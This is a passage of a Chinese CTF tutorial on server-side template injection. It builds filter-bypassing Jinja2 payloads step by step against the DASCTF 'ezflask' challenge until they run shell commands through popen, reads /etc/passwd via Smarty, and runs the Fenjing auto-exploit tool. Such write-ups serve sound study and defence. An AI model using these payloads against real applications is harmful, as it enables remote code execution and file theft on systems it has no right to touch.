+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过 <code>&lt;generator object select_or_reject at 0x7fe339298fc0&gt;</code> 字符串获取的字符有：尖号、字母、空格、下划线和数字。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以通过 <code>&lt;TemplateReference None&gt;</code> 字符串获取的字符有：尖号、字母和空格。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符，这个在下面第二道题中会讲到。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可获得到的字符更多了。</p>
+<ul>
+<li>对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> num = (self|<span class="built_in">int</span>) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 0, 通过int过滤器获取数字</span></span><br><span class="line">&#123;% <span class="built_in">set</span> num = (self|string|length) %&#125;&#123;&#123;num&#125;&#125;    <span class="comment"># 24, 通过length过滤器获取数字</span></span><br><span class="line">&#123;% <span class="built_in">set</span> point = self|<span class="built_in">float</span>|string|<span class="built_in">min</span> %&#125;    <span class="comment"># 通过float过滤器获取点 .</span></span><br></pre></td></tr></table></figure>
+
+<p>有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。</p>
+<p>下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。</p>
+<h5 id="2020-DASCTF-八月安恒月赛-ezflask"><a href="#2020-DASCTF-八月安恒月赛-ezflask" class="headerlink" title="[2020 DASCTF 八月安恒月赛]ezflask"></a>[2020 DASCTF 八月安恒月赛]ezflask</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        blacklist = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>]</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line">    <span class="keyword">elif</span> safe_jinja(request.args.get(<span class="string">&#x27;name&#x27;</span>)):</span><br><span class="line">        name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">&#x27;wendell&#x27;</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;!--flag in /flag--&gt;</span></span><br><span class="line"><span class="string">    &lt;!--python3.8--&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。</p>
+<p>在存在ssti的地方执行如下payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line"><span class="comment"># 或 &#123;% set org = (&#123; &#125;|select|string) %&#125;&#123;&#123;org&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到了一段字符串：<code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code>，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串中取到我们想要的字符，从而绕过过滤。</p>
+<p>然后我们在使用list()过滤器将字符串转化为列表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> orglst = (&#123; &#125;|select|string|<span class="built_in">list</span>) %&#125;&#123;&#123;orglst&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反回了一个列表，列表中是 <code>&lt;generator object select_or_reject at 0x7f06771f4150&gt;</code> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 <code>_</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;    <span class="comment"># _</span></span><br></pre></td></tr></table></figure>
+
+<p>同理还能取到更多的字符：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;&#123;&#123;spa&#125;&#125;    <span class="comment"># 空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;&#123;xhx&#125;&#125;    <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;&#123;&#123;zero&#125;&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">40</span>)|<span class="built_in">int</span>) %&#125;&#123;&#123;seven&#125;&#125;    <span class="comment"># 7</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;&#123;&#123;one&#125;&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;%<span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;%<span class="built_in">set</span> three = (zero-one-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 3</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line"><span class="comment">#  &#123;%set four = (one+three) %&#125;    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先构造出所需的数字:</span></span><br><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 0</span></span><br><span class="line">&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;    <span class="comment"># 1</span></span><br><span class="line">&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 2</span></span><br><span class="line">&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;    <span class="comment"># 4</span></span><br><span class="line">&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;    <span class="comment"># 5</span></span><br><span class="line">&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;    <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造出所需的各种字符与字符串: (这里的下标看具体情况)</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;    <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;    <span class="comment"># 空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> point = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">26</span>)|string) %&#125;    <span class="comment"># .</span></span><br><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;    <span class="comment"># 单引号 &#x27;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> left = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">189</span>)|string) %&#125;    <span class="comment"># 左括号 (</span></span><br><span class="line">&#123;% <span class="built_in">set</span> right = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">200</span>)|string) %&#125;    <span class="comment"># 右括号 )</span></span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;    <span class="comment"># 字符 c</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfh = self|string|urlencode|first %&#125;    <span class="comment"># 百分号 %</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;    <span class="comment"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span></span><br><span class="line">&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;    <span class="comment"># 使用%c构造斜杠 /</span></span><br><span class="line">&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;    <span class="comment"># builtins</span></span><br><span class="line">&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;    <span class="comment"># import</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;    <span class="comment"># popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;    <span class="comment"># os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;    <span class="comment"># cat</span></span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;    <span class="comment"># flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;    <span class="comment"># eval</span></span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;    <span class="comment"># read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;    <span class="comment"># __builtins__</span></span><br></pre></td></tr></table></figure>
+
+<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上图所示，成功构造出了 <code>__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code> 。</p>
+<p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;    <span class="comment"># globals</span></span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;    <span class="comment"># builtins</span></span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;    <span class="comment"># eval</span></span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125;    <span class="comment"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以最终的payload为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> zero = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">38</span>)|<span class="built_in">int</span>) %&#125;&#123;% <span class="built_in">set</span> one = (zero**zero)|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> two = (zero-one-one)|<span class="built_in">abs</span>|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> four = (two*two)|<span class="built_in">int</span> %&#125;&#123;% <span class="built_in">set</span> five = (two*two*two)-one-one-one %&#125;&#123;% <span class="built_in">set</span> seven = (zero-one-one-five)|<span class="built_in">abs</span> %&#125;&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)|string) %&#125;&#123;% <span class="built_in">set</span> space = ((&#123; &#125;|select|string|<span class="built_in">list</span>).pop(<span class="number">10</span>)|string) %&#125;&#123;% <span class="built_in">set</span> point = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">26</span>)|string) %&#125;&#123;% <span class="built_in">set</span> yin = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">195</span>)|string) %&#125;&#123;% <span class="built_in">set</span> left = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">189</span>)|string) %&#125;&#123;% <span class="built_in">set</span> right = ((app.__doc__|string|<span class="built_in">list</span>).pop(<span class="number">200</span>)|string) %&#125;&#123;% <span class="built_in">set</span> c = <span class="built_in">dict</span>(c=aa)|reverse|first %&#125;&#123;% <span class="built_in">set</span> bfh=self|string|urlencode|first %&#125;&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;&#123;% <span class="built_in">set</span> slas = bfhc%((four~seven)|<span class="built_in">int</span>) %&#125;&#123;% <span class="built_in">set</span> but = <span class="built_in">dict</span>(buil=aa,tins=dd)|join %&#125;&#123;% <span class="built_in">set</span> imp = <span class="built_in">dict</span>(imp=aa,ort=dd)|join %&#125;&#123;% <span class="built_in">set</span> pon = <span class="built_in">dict</span>(po=aa,pen=dd)|join %&#125;&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join %&#125;&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join %&#125;&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join %&#125;&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join %&#125;&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join %&#125;&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> %&#125;&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;&#123;% <span class="keyword">if</span> f == bul %&#125;&#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;&#123;% <span class="keyword">if</span> a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>强过滤版：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> zero=((&#123;&#125;|select|string|<span class="built_in">list</span>)|sort|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">4</span>)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span> one=(zero**zero)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> two=(zero-one-one)|<span class="built_in">abs</span>|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> four=(two*two)|<span class="built_in">int</span>%&#125;&#123;%<span class="built_in">set</span> five=(two*two*two)-one-one-one%&#125;&#123;%<span class="built_in">set</span> seven=(zero-one-one-five)|<span class="built_in">abs</span>%&#125;&#123;%<span class="built_in">set</span> xhx=((&#123;&#125;|select|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">24</span>)|string)%&#125;&#123;%<span class="built_in">set</span> space=((&#123;&#125;|select|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">10</span>)|string) %&#125;&#123;%<span class="built_in">set</span> point=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">26</span>)|string)%&#125;&#123;%<span class="built_in">set</span> yin=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">181</span>)|string)%&#125;&#123;%<span class="built_in">set</span> left=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">195</span>)|string)%&#125;&#123;%<span class="built_in">set</span> right=((app|attr(xhx~xhx~<span class="string">&#x27;doc&#x27;</span>~xhx~xhx)|string|<span class="built_in">list</span>)|attr(<span class="string">&#x27;pop&#x27;</span>)(<span class="number">199</span>)|string)%&#125;&#123;%<span class="built_in">set</span> c=<span class="built_in">dict</span>(c=aa)|reverse|first %&#125;&#123;%<span class="built_in">set</span> bfh=self|string|urlencode|first %&#125;&#123;% <span class="built_in">set</span> bfhc=bfh~c %&#125;&#123;%<span class="built_in">set</span> slas=bfhc%((four~seven)|<span class="built_in">int</span>)%&#125;&#123;%<span class="built_in">set</span> but=<span class="built_in">dict</span>(buil=aa,tins=dd)|join%&#125;&#123;%<span class="built_in">set</span> imp=<span class="built_in">dict</span>(imp=aa,ort=dd)|join%&#125;&#123;%<span class="built_in">set</span> pon=<span class="built_in">dict</span>(po=aa,pen=dd)|join%&#125;&#123;%<span class="built_in">set</span> ooo=<span class="built_in">dict</span>(o=aa,s=dd)|join%&#125;&#123;%<span class="built_in">set</span> ca=<span class="built_in">dict</span>(ca=aa,t=dd)|join%&#125;&#123;%<span class="built_in">set</span> flg=<span class="built_in">dict</span>(fl=aa,ag=dd)|join%&#125;&#123;%<span class="built_in">set</span> ev=<span class="built_in">dict</span>(ev=aa,al=dd)|join%&#125;&#123;%<span class="built_in">set</span> red=<span class="built_in">dict</span>(re=aa,ad=dd)|join%&#125;&#123;%<span class="built_in">set</span> bul=xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span>%&#125;&#123;%<span class="built_in">set</span> pld=xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~ooo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%&#125;&#123;%<span class="keyword">for</span> f,v <span class="keyword">in</span> whoami|attr(xhx~xhx~<span class="string">&#x27;init&#x27;</span>~xhx~xhx)|attr(xhx~xhx~<span class="string">&#x27;globals&#x27;</span>~xhx~xhx)|attr(<span class="string">&#x27;items&#x27;</span>)()%&#125;&#123;%<span class="keyword">if</span> f==bul%&#125;&#123;%<span class="keyword">for</span> a,b <span class="keyword">in</span> v|attr(<span class="string">&#x27;items&#x27;</span>)()%&#125;&#123;%<span class="keyword">if</span> a==ev%&#125;&#123;%<span class="built_in">print</span>(b(pld))%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fenjing-SSTI通杀"><a href="#Fenjing-SSTI通杀" class="headerlink" title="Fenjing SSTI通杀"></a>Fenjing SSTI通杀</h4><p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pip3 install fenjing</span><br><span class="line">$ python3 -m fenjing crack -u <span class="string">&quot;http://node5.anna.nssctf.cn:28879/get_flag&quot;</span> -i <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/">浅析SSTI(python沙盒绕过)</a></p>
+<p><a target="_blank" rel="noopener" href="http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">Jinja2过滤器</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA">关于Flask SSTI，解锁你不知道的新姿势</a><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA">https://mp.weixin.qq.com/s/Uvr3NlKrzZoWyJvwFUFlEA</a>)</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
+</blockquote>
+<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p><code>&#123;$smarty.version&#125;</code>可以查看smarty版本</p>
+<h3 id="1、-php-php"><a href="#1、-php-php" class="headerlink" title="1、{php}{/php}"></a>1、<code>&#123;php&#125;&#123;/php&#125;</code></h3><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p>
+<h3 id="2、-literal"><a href="#2、-literal" class="headerlink" title="2、{literal}"></a>2、<code>&#123;literal&#125;</code></h3><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
+<p>那么对于php5的环境我们就可以使用</p>
+<script language="php">phpinfo();</script>
+
+<h3 id="3、-if"><a href="#3、-if" class="headerlink" title="3、{if}"></a>3、<code>&#123;if&#125;</code></h3><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等  </p>
+<p><code>&#123;if phpinfo()&#125;&#123;/if&#125;</code></p>
+<h3 id="4、getStreamVariable"><a href="#4、getStreamVariable" class="headerlink" title="4、getStreamVariable"></a>4、getStreamVariable</h3><p>新版本失效<br><code>&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</code></p>
+<h2 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h2><p>文件读取</p>
